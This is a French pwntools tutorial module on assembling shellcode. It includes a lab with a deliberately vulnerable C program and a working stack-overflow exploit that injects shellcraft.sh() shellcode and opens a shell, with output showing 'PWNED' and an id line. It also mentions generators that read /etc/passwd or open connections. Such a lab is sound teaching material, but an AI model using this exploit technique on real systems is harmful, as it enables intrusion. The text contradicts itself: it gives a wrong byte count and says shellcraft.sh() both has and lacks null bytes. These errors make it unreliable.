# 04 — Assembleur et shellcode

[← Module](README.md)

## Objectif

Assembler et désassembler sans quitter Python, générer un shellcode fonctionnel avec
`shellcraft`, et l'exécuter pour de vrai en détournant la pile d'un binaire.

## asm et disasm

pwntools embarque GNU as et capstone. On écrit de l'assembleur, on récupère les octets :

```python
from pwn import *

context.arch = "amd64"
context.log_level = "error"

code = asm("mov rax, 60; xor rdi, rdi; syscall")
print("asm  ->", code.hex())
print(disasm(code))
```

```text
asm  -> 48c7c03c0000004831ff0f05
   0:   48 c7 c0 3c 00 00 00    mov    rax, 0x3c
   7:   48 31 ff                xor    rdi, rdi
   a:   0f 05                   syscall
```

Ce shellcode de dix octets appelle `exit(0)`. Le contrôle est immédiat : `asm` puis `disasm` sur
le résultat doit redonner la même chose.

## shellcraft

`shellcraft` génère du shellcode à partir d'une description. Le cas le plus courant tient en une
ligne :

```python
sc = asm(shellcraft.sh())
print(len(sc), "octets")
print(disasm(sc))
```

```text
48 octets
   0:   6a 68                   push   0x68
   2:   48 b8 2f 62 69 6e 2f 2f 2f 73   movabs rax, 0x732f2f2f6e69622f
   c:   50                      push   rax
   d:   48 89 e7                mov    rdi, rsp
  10:   68 72 69 01 01          push   0x1016972
  15:   81 34 24 01 01 01 01    xor    DWORD PTR [rsp], 0x1010101
  1c:   31 f6                   xor    esi, esi
  1e:   56                      push   rsi
  1f:   6a 08                   push   0x8
  21:   5e                      pop    rsi
  22:   48 01 e6                add    rsi, rsp
  25:   56                      push   rsi
  26:   48 89 e6                mov    rsi, rsp
  29:   31 d2                   xor    edx, edx
  2b:   6a 3b                   push   0x3b
  2d:   58                      pop    rax
  2e:   0f 05                   syscall
```

48 octets, aucun octet nul : le shellcode peut passer dans un `read`, un `strcpy` ou un champ de
formulaire. C'est exactement pour cela que `shellcraft` construit `/bin/sh` avec des `push` et des
`xor` plutôt qu'avec des constantes littérales.

Autres générateurs utiles : `shellcraft.cat("/etc/passwd")`, `shellcraft.connect(...)`,
`shellcraft.findpeer()`, et la variante `shellcraft.amd64.linux.sh()` quand on veut être explicite.

## Lab : exécuter le shellcode

```c
/* shellcode.c — compilation :
   gcc -fno-stack-protector -no-pie -z execstack -o shellcode shellcode.c */
#include <stdio.h>
#include <unistd.h>

void vuln(void) {
    char buf[128];
    printf("buf = %p\n", (void *)buf);   /* fuite : sans elle, il faudrait gdb */
    read(0, buf, 400);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    puts("Entree :");
    vuln();
    return 0;
}
```

Le programme affiche l'adresse de son tampon, puis lit 400 octets dans 128. L'exploit place le
shellcode au début du tampon et écrase l'adresse de retour par l'adresse du tampon.

```python
from pwn import *

context.arch = "amd64"
context.log_level = "error"

sc = asm(shellcraft.sh())
print("shellcode :", len(sc), "octets")

io = process("./shellcode")
io.recvuntil(b"Entree :\n")
buf = int(io.recvline().split(b"= ")[1], 16)
print("buf       :", hex(buf))

payload  = sc.ljust(128, b"\x90")          # shellcode + NOP jusqu'au bord du tampon
payload += p64(0xdeadbeefcafebabe)         # saved rbp, écrasé sans conséquence
payload += p64(buf)                        # adresse de retour = début du tampon

io.send(payload)
io.sendline(b"echo PWNED; id")
print(io.recvall(timeout=3).decode(errors="replace").strip())
```

```text
shellcode : 48 octets
buf       : 0x7ffc37eb4190
PWNED
uid=10001(openhands) gid=10001(openhands) groups=10001(openhands),27(sudo)
```

Le déroulé exact : `read` écrit 144 octets dans un tampon de 128, les 8 octets suivants écrasent
`rbp`, les 8 derniers écrasent l'adresse de retour ; `leave` puis `ret` sautent donc dans le
tampon, à l'octet près.

## Pourquoi la fuite est nécessaire

Sans `printf("buf = %p")`, l'adresse du tampon est randomisée par ASLR et l'exploit ne peut pas la
deviner. Deux solutions en pratique :

- le binaire fuit lui-même une adresse de pile (cas de ce lab, fréquent en CTF débutant) ;
- on relève l'adresse dans `gdb` avec l'ASLR coupée (`set disable-randomization on`, actif par
  défaut) et on exécute la cible avec `setarch -R ./shellcode`. Fragile : la moindre variable
  d'environnement décale la pile, et l'adresse relevée ne correspond plus.

La première méthode est reproductible ; la seconde dépanne quand il n'y a pas d'autre choix.

## Pièges

| Symptôme | Cause |
| --- | --- |
| `SIGILL` à l'exécution | adresse de retour fausse : on atterrit au milieu d'une instruction |
| `SIGSEGV` immédiat | NX actif : la pile n'est pas exécutable |
| Shellcode tronqué | octet `\x00` ou `\n` dans le payload, filtré par la cible |
| `shellcraft.sh()` inutilisable dans un `strcpy` | il contient des `\x00` dans les adresses empilées : utiliser `shellcraft.sh().replace(...)` ou un encoder |

## À retenir

- `asm` / `disasm` permettent de vérifier un encodage en une ligne.
- `shellcraft.sh()` fait 48 octets, sans octet nul : c'est un choix, pas un hasard.
- Le shellcode n'est possible que si la pile est exécutable (`Stack: Executable`).
- Sans fuite d'adresse, un shellcode sur la pile est un pari sur l'ASLR.
